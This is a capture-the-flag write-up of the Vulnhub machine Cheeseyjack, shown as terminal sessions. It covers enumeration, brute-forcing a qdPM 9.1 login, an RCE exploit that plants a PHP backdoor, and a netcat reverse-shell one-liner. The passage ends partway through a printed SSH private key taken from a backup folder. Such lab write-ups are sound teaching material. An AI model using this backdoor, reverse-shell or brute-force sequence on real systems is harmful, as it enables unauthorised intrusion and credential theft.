---
title: Write-up Cheeseyjack on Vulnhub
author: eMVee
date: 2023-05-03 20:00:00 +0800
categories: [CTF, Vulnhub]
tags: [Vulnhub, OSCP]
render_with_liquid: false
---

While working on OSCP, I came a cross a webapplication qdPM9.1 in one of the walkthrough exercises where I had to create a wordlist with cewl and launch a dictionary attack against the webapplication. My attack was succesful with Burp Suite Intruder, but this was not succesful with Hydra. It frustrated me and I started to write my own script in Python. Then I started searching if there was another machine with this webapplication so I could test all of them and write a walkthrough. The machine called Cheeseyjack is hosted on [Vulnhub](https://www.vulnhub.com/entry/cheesey-cheeseyjack,578/) and can be downloaded there.


## Getting started
First things first! Let's create a working directory.
```bash
┌──(emvee㉿kali)-[~]
└─$ cd Documents/Vulnhub/CheeceyJack
```
Now let's check our own IP address.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ myip                   

    inet 127.0.0.1
    inet 10.0.2.15
```
Now let's check what IP address is assigned to the victim machine. The first method could be done with `arp-scan`.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ sudo arp-scan --localnet              
[sudo] password for emvee: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:e0:29:f9, IPv4: 10.0.2.15
Starting arp-scan 1.9.8 with 256 hosts (https://github.com/royhills/arp-scan)
10.0.2.1        52:54:00:12:35:00       QEMU
10.0.2.2        52:54:00:12:35:00       QEMU
10.0.2.3        08:00:27:d4:38:66       PCS Systemtechnik GmbH
10.0.2.42       08:00:27:e1:b2:df       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.8: 256 hosts scanned in 2.223 seconds (115.16 hosts/sec). 4 responded
```
Let's double check the IP addresses in the virtual network with `fping`.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ fping -ag 10.0.2.0/24 2> /dev/null
10.0.2.1
10.0.2.2
10.0.2.3
10.0.2.15
10.0.2.42
```
Our target is running on IP address `10.0.2.42`. Let's assign this to a variable called ip.
```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ ip=10.0.2.42  
```
Now we are ready to rumble and gather some information.

----
## Enumeration

We start with a basic port scan to identify some open ports and running services.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nmap -sC -sV $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:26 CEST
Nmap scan report for 10.0.2.42
Host is up (0.00026s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 968424c807d0ec6351e0af28ef62dfaf (RSA)
|   256 7b2bf8339baf9a05e8a314eca9f7c16f (ECDSA)
|_  256 9d0e359c6aef2f85c0aa65de0725747f (ED25519)
80/tcp   open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WeBuild - Bootstrap Coming Soon Template
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46431/tcp   mountd
|   100005  1,2,3      51235/tcp6  mountd
|   100005  1,2,3      52049/udp6  mountd
|   100005  1,2,3      56560/udp   mountd
|   100021  1,3,4      36795/tcp   nlockmgr
|   100021  1,3,4      45161/tcp6  nlockmgr
|   100021  1,3,4      52530/udp   nlockmgr
|   100021  1,3,4      53459/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp  open  netbios-ssn Samba smbd 4.6.2
445/tcp  open  netbios-ssn Samba smbd 4.6.2
2049/tcp open  nfs_acl     3 (RPC #100227)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 2h00m09s
|_nbstat: NetBIOS name: CHEESEYJACK, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb2-time: 
|   date: 2023-05-03T16:26:56
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.55 seconds

```
Nmap found some interesting information. Let's first add it to our notes.
* Linux, probably Ubuntu
* Port 22
	* SSH
* Port 80
	* HTTP
	* Apache 2.4.41
	* Title: WeBuild - Bootstrap Coming Soon Template
* Port 111
	* RPC
* Port 139 + 445
	* SMB
* Port 2049
	* NFS

While running an advanced port scan with nmap we could enumerate the webservice with whatweb.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ whatweb http://$ip                                              
http://10.0.2.42 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@cheeseyjack.loca,info@example.com], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.0.2.42], JQuery, Script, Title[WeBuild - Bootstrap Coming Soon Template]
```
Whatweb discovered some email addresses. So we have to add them to our notes.
Email
* info@cheeseyjack.local
* info@example.com 

While nmap is still running we can use nikto to see if there are some vulnerabilities what we can use.
```
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nikto -h http://$ip
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.0.2.42
+ Target Hostname:    10.0.2.42
+ Target Port:        80
+ Start Time:         2023-05-03 16:29:50 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Server may leak inodes via ETags, header found with file /, inode: 1c4f, size: 5b0154d77dd2e, mtime: gzip
+ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
+ 7915 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2023-05-03 16:31:05 (GMT2) (75 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


```
Nikto did not discover juicy information on our target.  Let's check nmap to see if there are some more services running on the target.


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:28 CEST
Nmap scan report for 10.0.2.42
Host is up (0.00084s latency).
Not shown: 65524 closed tcp ports (reset)
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 968424c807d0ec6351e0af28ef62dfaf (RSA)
|   256 7b2bf8339baf9a05e8a314eca9f7c16f (ECDSA)
|_  256 9d0e359c6aef2f85c0aa65de0725747f (ED25519)
80/tcp    open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: WeBuild - Bootstrap Coming Soon Template
111/tcp   open  rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46431/tcp   mountd
|   100005  1,2,3      51235/tcp6  mountd
|   100005  1,2,3      52049/udp6  mountd
|   100005  1,2,3      56560/udp   mountd
|   100021  1,3,4      36795/tcp   nlockmgr
|   100021  1,3,4      45161/tcp6  nlockmgr
|   100021  1,3,4      52530/udp   nlockmgr
|   100021  1,3,4      53459/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open  netbios-ssn Samba smbd 4.6.2
445/tcp   open  netbios-ssn Samba smbd 4.6.2
2049/tcp  open  nfs_acl     3 (RPC #100227)
33060/tcp open  mysqlx?
36795/tcp open  nlockmgr    1-4 (RPC #100021)
39409/tcp open  mountd      1-3 (RPC #100005)
40307/tcp open  mountd      1-3 (RPC #100005)
46431/tcp open  mountd      1-3 (RPC #100005)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.93%I=7%D=5/3%Time=64526F9E%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(Help,9,"\x05\0\0\0\x0b\x
SF:08\x05\x1a\0");
MAC Address: 08:00:27:E1:B2:DF (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-05-03T16:31:20
|_  start_date: N/A
|_nbstat: NetBIOS name: CHEESEYJACK, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
|_clock-skew: 2h00m09s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

TRACEROUTE
HOP RTT     ADDRESS
1   0.84 ms 10.0.2.42

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 186.20 second
```
The advanced nmap port scan discovered some open ports in the high range. Even probably a database service. For now we only have to add one port to our notes.
* Port 33060
	* SQL?

There is a RPC service running on port 111. It is possible to enumerate this service with nmap.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nmap -sV -p 111 --script=rpcinfo $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:37 CEST
Nmap scan report for 10.0.2.42
Host is up (0.00092s latency).

PORT    STATE SERVICE VERSION
111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      46431/tcp   mountd
|   100005  1,2,3      51235/tcp6  mountd
|   100005  1,2,3      52049/udp6  mountd
|   100005  1,2,3      56560/udp   mountd
|   100021  1,3,4      36795/tcp   nlockmgr
|   100021  1,3,4      45161/tcp6  nlockmgr
|   100021  1,3,4      52530/udp   nlockmgr
|   100021  1,3,4      53459/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.63 seconds
```
Based on this information I see port 2049 and nfs again. We might could use nmap on this port to see if we can see something about the nfs share.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nmap -p 111 --script nfs* $ip
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 16:38 CEST
Nmap scan report for 10.0.2.42
Host is up (0.00064s latency).

PORT    STATE SERVICE
111/tcp open  rpcbind
| nfs-showmount: 
|_  /home/ch33s3m4n *

Nmap done: 1 IP address (1 host up) scanned in 13.47 seconds

```
nmap discovered a mount point for a a home directory. Let's add this to our notes.
* /home/ch33s3m4n

Let's mount the share to enumerate some more information from the share.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ sudo mount -o nolock $ip:/home/ch33s3m4n /home/emvee/Documents/Vulnhub/CheeceyJack/ch33s3m4n 
```
Now we should change the working directory to the mounted share and discover what directories and files are shared.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cd /home/emvee/Documents/Vulnhub/CheeceyJack/ch33s3m4n

┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack/ch33s3m4n]
└─$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos

```
 There are several directories which we should inspect. Let's start with Documents followed by Downloads.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack/ch33s3m4n]
└─$ ls Documents 

┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack/ch33s3m4n]
└─$ ls Downloads 
qdPM_9.1.zip

```
It looks like there is a file qdPM9.1zip present in the home directory. Let's keep this in mind and enumerate the webservice. In the previous enumeration on this service we did not search for directories and files. So, let's use dirsearch to identify some of them.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ dirsearch -u http://$ip -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

   _|. _ _  _  _  _ _|_    v0.4.2                                        
  (_||| _) (/_(_|| (_| ) 
 
Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/10.0.2.42/_23-05-03_16-48-03.txt

Error Log: /home/emvee/.dirsearch/logs/errors-23-05-03_16-48-03.log

Target: http://10.0.2.42/

[16:48:03] Starting: 
[16:48:04] 301 -  307B  - /assets  ->  http://10.0.2.42/assets/            
[16:48:04] 301 -  306B  - /forms  ->  http://10.0.2.42/forms/              
[16:48:57] 301 -  319B  - /project_management  ->  http://10.0.2.42/project_management/

```
While dirsearch is still running and I already noticed a interesting directory name we should enumerate the website it self as well.

![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165330.png){: width="700" height="400" }

There is a `contact us` page, we should see if we can find anything useful.
![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165412.png){: width="700" height="400" }

There is the email address again. Let's update a email addresses list with the found one and craft a email address for `ch33se3m4n`.

```email-addresses
info@cheeseyjack.local
ch33s3m4n@cheeseyjack.local
```
After looking at the website, let's check the diriectory `project_management` found by dirsearch.
![Image](/assets/img/WriteUp/Vulnhub/Cheeseyjack/Pasted image 20230503165729.png){: width="700" height="400" }

A logon page is shown. Even a version of this application is shown. It is the same as in the Downloads folder which we have seen earlier. Perhaps there is a vulnerbaility known for this version. Let's check that with searchsploit.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ searchsploit qdpm
--------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                   |  Path
--------------------------------------------------------------------------------- ---------------------------------
qdPM 7 - Arbitrary File upload                                                   | php/webapps/19154.py
qdPM 7.0 - Arbitrary '.PHP' File Upload (Metasploit)                             | php/webapps/21835.rb
qdPM 9.1 - 'cfg[app_app_name]' Persistent Cross-Site Scripting                   | php/webapps/48486.txt
qdPM 9.1 - 'filter_by' SQL Injection                                             | php/webapps/45767.txt
qdPM 9.1 - 'search[keywords]' Cross-Site Scripting                               | php/webapps/46399.txt
qdPM 9.1 - 'search_by_extrafields[]' SQL Injection                               | php/webapps/46387.txt
qdPM 9.1 - 'type' Cross-Site Scripting                                           | php/webapps/46398.txt
qdPM 9.1 - Arbitrary File Upload                                                 | php/webapps/48460.txt
qdPM 9.1 - Remote Code Execution                                                 | php/webapps/47954.py
qdPM 9.1 - Remote Code Execution (Authenticated)                                 | php/webapps/50175.py
qdPM 9.1 - Remote Code Execution (RCE) (Authenticated) (v2)                      | php/webapps/50944.py
qdPM 9.2 - Cross-site Request Forgery (CSRF)                                     | php/webapps/50854.txt
qdPM 9.2 - Password Exposure (Unauthenticated)                                   | php/webapps/50176.txt
qdPM < 9.1 - Remote Code Execution                                               | multiple/webapps/48146.py
--------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```
There is an authenticated remote code execution vulnerability available for this version.
Let's create a usernames list containt with the email addresses since the usernames should be an email address.


```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ nano email.txt

┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cat email.txt 
info@cheeseyjack.local
ch33s3m4n@cheeseyjack.local
```
We need a password list to brute force the credentials. My strategy is to create a wordlist based on the main website and on the project management tool.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cewl http://$ip/project_management -d 4 -m 4 -w passwords1.txt
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                   
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cewl http://$ip -d 4 -m 4 -w passwords2.txt 
CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
                                                                                                                   
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cat passwords1.txt passwords2.txt > passwords.txt
  
```
Since this application is something I encountered earlier and the results where not satisified with Hydra, I have written my own script for this tool. This can be found on my [Github](https://github.com/eMVee-NL/Bruteforcer-qdPM). The script can be easily cloned into your machine and then we need to change the working directory.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ git clone https://github.com/eMVee-NL/Bruteforcer-qdPM.git
Cloning into 'Bruteforcer-qdPM'...
remote: Enumerating objects: 27, done.
remote: Counting objects: 100% (27/27), done.
remote: Compressing objects: 100% (27/27), done.
remote: Total 27 (delta 11), reused 0 (delta 0), pack-reused 0
Receiving objects: 100% (27/27), 137.77 KiB | 5.10 MiB/s, done.
Resolving deltas: 100% (11/11), done.

┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ cd Bruteforcer-qdPM 
```
After changing the working directory and having the required input files ready, the script could be started.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack/Bruteforcer-qdPM]
└─$ python3 Bruteforcer-qdPM-9-1.py -url http://$ip/project_management/ -u ../email.txt  -p ../passwords.txt

        ____             __       ____                                       ______  __  _______   ___
       / __ )_______  __/ /____  / __/___  _____________  _____   ____ _____/ / __ \/  |/  / __ \ <  /
      / __  / ___/ / / / __/ _ \/ /_/ __ \/ ___/ ___/ _ \/ ___/  / __ `/ __  / /_/ / /|_/ / /_/ / / / 
     / /_/ / /  / /_/ / /_/  __/ __/ /_/ / /  / /__/  __/ /     / /_/ / /_/ / ____/ /  / /\__, / / /  
    /_____/_/   \__,_/\__/\___/_/  \____/_/   \___/\___/_/      \__, /\__,_/_/   /_/  /_//____(_)_/   
                                                                  /_/                                       
                      __  ____   __       
                  ___|  \/  \ \ / /__ ___ 
                 / -_) |\/| |\ V / -_) -_)
    Powered by:  \___|_|  |_| \_/\___\___|
                          
    
Number of passwords loaded:  132
Number of usernames loaded:  2
Number of attempts to brute force:  264 

Found some credentials!
The username is: ch33s3m4n@cheeseyjack.local
The password is: qdpm


Finished!

```
We got a valid username and password found by brute forcing. With this information we can run the exploit to upload a malicious file what helps us execute commands from our target.

```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ python3 50944.py -url http://10.0.2.42/project_management/ -u ch33s3m4n@cheeseyjack.local -p qdpm
You are not able to use the designated admin account because they do not have a myAccount page.

The DateStamp is 2023-05-04 09:59 
Backdoor uploaded at - > http://10.0.2.42/project_management/uploads/users/639322-backdoor.php?cmd=whoami
```
An example how we should executed the command via the URL is shown to us. Now let's use curl to see what we get back.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ curl -v http://10.0.2.42/project_management/uploads/users/639322-backdoor.php?cmd=whoami                                                      
*   Trying 10.0.2.42:80...
* Connected to 10.0.2.42 (10.0.2.42) port 80 (#0)
> GET /project_management/uploads/users/639322-backdoor.php?cmd=whoami HTTP/1.1
> Host: 10.0.2.42
> User-Agent: curl/7.87.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 04 May 2023 17:01:14 GMT
< Server: Apache/2.4.41 (Ubuntu)
< Content-Length: 20
< Content-Type: text/html; charset=UTF-8
< 
<pre>www-data
* Connection #0 to host 10.0.2.42 left intact
</pre>   
```
It looks like `www-data` is running our commands. Now we could create a netcat listener and run a command to establish a reverse shell.

```bash
┌──(emvee㉿kali)-[~]
└─$ sudo rlwrap nc -lvp 443         
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443

```
Now we should run our command for a reverse shell including the data url encoding so it is executed correctly on the target.
```bash
┌──(emvee㉿kali)-[~/Documents/Vulnhub/CheeceyJack]
└─$ curl -v http://10.0.2.42/project_management/uploads/users/639322-backdoor.php --data-urlencode "cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.0.2.15 443 >/tmp/f"

*   Trying 10.0.2.42:80...
* Connected to 10.0.2.42 (10.0.2.42) port 80 (#0)
> POST /project_management/uploads/users/639322-backdoor.php HTTP/1.1
> Host: 10.0.2.42
> User-Agent: curl/7.87.0
> Accept: */*
> Content-Length: 115
> Content-Type: application/x-www-form-urlencoded
> 


```

## Initial access
We should check our netcat listener to see if the connection has been established.
```bash
┌──(emvee㉿kali)-[~]
└─$ sudo rlwrap nc -lvp 443         
[sudo] password for emvee: 
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.0.2.42.
Ncat: Connection from 10.0.2.42:60638.
bash: cannot set terminal process group (797): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ 

```
Let's find out who we are, what memberships we have and on what host we are working.
```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ whoami;id;hostname
<roject_management/uploads/users$ whoami;id;hostname                 
www-data
uid=33(www-data) gid=33(www-data) groups=33(www-data)
cheeseyjack

```
We are running our commands as `www-data`, we should gain more privileges on our victim. It's about time to enumerate some users on the system.
```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ awk -F: '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd
< '($3>=1000)&&($1!="nobody"){print $1}' /etc/passwd                 
ch33s3m4n
crab
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ ls /home
ls /home
ch33s3m4n
crab

```
There are two users on the system, both with a home directory. Perhaps there are some interesting files in their home directories.
We should enumerate them.
```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ ls -ahlR /home
<ml/project_management/uploads/users$ ls -ahlR /home                 
/home:
total 16K
drwxr-xr-x  4 root      root      4.0K Sep 24  2020 .
drwxr-xr-x 20 root      root      4.0K Sep 24  2020 ..
drwxr-xr-x 16 ch33s3m4n ch33s3m4n 4.0K Oct  8  2020 ch33s3m4n
drwxr-xr-x 10 crab      crab      4.0K Oct 10  2020 crab

<=== SNIP ===>

/home/crab:
total 44K
drwxr-xr-x 10 crab crab 4.0K Oct 10  2020 .
drwxr-xr-x  4 root root 4.0K Sep 24  2020 ..
lrwxrwxrwx  1 root root    9 Oct  8  2020 .bash_history -> /dev/null
drwxrwxr-x  2 crab crab 4.0K Sep 24  2020 .bin
drwx------  4 crab crab 4.0K Sep 24  2020 .cache
drwx------  4 crab crab 4.0K Sep 24  2020 .config
drwxr-xr-x  3 crab crab 4.0K Sep 24  2020 .local
drwx------  2 crab crab 4.0K Sep 24  2020 .ssh
drwxrwxr-x  2 crab crab 4.0K Sep 24  2020 Desktop
drwxrwxr-x  2 crab crab 4.0K Sep 24  2020 Documents
drwxrwxr-x  2 crab crab 4.0K Sep 24  2020 Videos
-rw-r--r--  1 crab crab  179 Oct 10  2020 todo.txt

<=== SNIP ===>
```
There is a `todo.txt` file available. We should inspect this file.
```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cat /home/crab/todo.txt
<t_management/uploads/users$ cat /home/crab/todo.txt                 
1. Scold cheese for weak qdpm password (done)
2. Backup SSH keys to /var/backups
3. Change cheese's weak password
4. Milk
5. Eggs
6. Stop putting my grocery list on my todo lists
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ 
```
The todo mentions something about a backup of SSH keys in `/var/backups`. This sounds very interesting, so let's see what we can discover there.
```bash
www-data@cheeseyjack:/var/www/html/project_management/uploads/users$ cd /var/backups
<l/project_management/uploads/users$ cd /var/backups                 
www-data@cheeseyjack:/var/backups$ ls
ls
alternatives.tar.0
alternatives.tar.1.gz
apt.extended_states.0
dpkg.arch.0
dpkg.arch.1.gz
dpkg.arch.2.gz
dpkg.diversions.0
dpkg.diversions.1.gz
dpkg.diversions.2.gz
dpkg.statoverride.0
dpkg.statoverride.1.gz
dpkg.statoverride.2.gz
dpkg.status.0
dpkg.status.1.gz
dpkg.status.2.gz
ssh-bak

```
There is an SSH-bak directory available. We should look into this to see what it contains. If there is a SSH key, we could just use it.
```bash
www-data@cheeseyjack:/var/backups$ cd ssh-bak
cd ssh-bak
www-data@cheeseyjack:/var/backups/ssh-bak$ ls
ls
key.bak
www-data@cheeseyjack:/var/backups/ssh-bak$ cat key.bak
cat key.bak
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAtJC+LREOJAPpq2WEbIuP42MmB/4xsHJRi8O7vsUPvhVSSpPWdiLA
ifuRxcfIsfI+bCEw7PKc+KBwaZ/6t/+R/mDTSL9JvuMcM2UDcy+Qm4DbOKnNEviXcwPvGa
hPGSl2KUjByEUrETlNl39xAITQCu8z3fDnSr8hWX9dsVA1CJJdzMQFhSh4Uq9+jN7ANa2F
l2Arrnsa8ofcuHbbU79wS9Txz+mteSGJw7mmBRiYYF1crWVa+KSfD4ff2weeQ02n8agNKS
JVT7TnNZt/KjnKoDswE9Cr794F7nBubFpG7KXwMi569A3zQh0JKh4cumMzdF4gVUxXQoYS
VtZe6W0AU2anx9dzHSvHVL2Tz9ECbM5yUHNO0Dy12PbdxV9OxGi24PPutNvsq9WKJynAcu
bdViB/9Htr/BqhJ3Nvdpfxg3LFDr31o2vfv/PoYuKzgiaQNeGq2fgq/L60npgWys8OgPXC
i6rQEDtr1Q7q0AEAGVv2swvyCsexCxtEGsauuYd9AAAFiJJ2+9KSdvvSAAAAB3NzaC1yc2
EAAAGBALSQvi0RDiQD6atlhGyLj+NjJgf+MbByUYvDu77FD74VUkqT1nYiwIn7kcXHyLHy
PmwhMOzynPigcGmf+rf/kf5g00i/Sb7jHDNlA3MvkJuA2zipzRL4l3MD7xmoTxkpdilIwc
hFKxE5TZd/cQCE0ArvM93w50q/IVl/XbFQNQiSXczEBYUoeFKvfozewDWthZdgK657GvKH
3Lh221O/cEvU8c/prXkhicO5pgUYmGBdXK1lWviknw+H39sHnkNNp/GoDSkiVU+05zWbfy
o5yqA7MBPQq+/eBe5wbmxaRuyl8DIuevQN80IdCSoeHLpjM3ReIFVMV0KGElbWXultAFNm
p8fXcx0rx1S9k8/RAmzOclBzTtA8tdj23cVfTsRotuDz7rTb7KvViicpwHLm3VYgf/R7a/
waoSdzb3aX8YNyxQ699aNr37/z6GLis4ImkDXhqtn4Kvy+tJ6YFsrPDoD1wouq0BA7a9UO
6tABABlb9rML8grHsQsbRBrGrrmHfQAAAAMBAAEAAAGBAKxaLO0fhnviMD0mHYzuel312e
tvO0bNGAFsx9yEhU5PU8lT7DW/XkFXHAHJfUw9ik/0Lps9yY+YtTRdPBg9nsFM8uBRlrba
WaTFGtHr6QBFsvsXOWSOXSGv855uBXJjHSKzDCV5wG4kYGfngZmZLGwDf2Kt/FhgsBiZdn
k1simIbHhz80DzLEbgtM8KIDYcd5PSfF+DqmkuPgTljt0Vsr7veBGZX7hrxvBIWKwsmeYB
t+DbCkaj/B/69jY/w1VC3R02GY12WF/QQ470dVQce68HWLAM3PmeAh/vurYED6pUnELEbk
b5vdzPNZfTaLmWZLKMKM5Cf+nrP7WCZRb6Jd+Gb5CP0GBRM3a4+kuxTnvb1YGpJtf6DgIW
dsqWdl9F38il+xokiRLFB5AMZA7CE/N7+7w+/vAF8eH578zO8BpG97LQOko18OE8FEaS08
NCC9mmTW3VBDBidHjOYW5Gi3UPqFTEiVeiQffvpsebna/eRbDxKxplPdRr8Ql2M3w2AQAA
AMAAkEVmKEgtFiqPA8kpNZY06PBkb8DlVFlaeUYyKcvFBRGgcGEIhss4MJctSqcuUhU/Vq
d5HaM0WG7LWK0RuYpM1I4tmZDmRxpRdU7x66RZ6FpqH3zmSdzSXYr7FR14ybYxhdJpwg15
1xMSCmDNT2wd1zV12k3IUs18D2ZkJOhZuR/b5hdU0FwGl22PDPO1Mp2sOwl/nBrwMk0Sjk
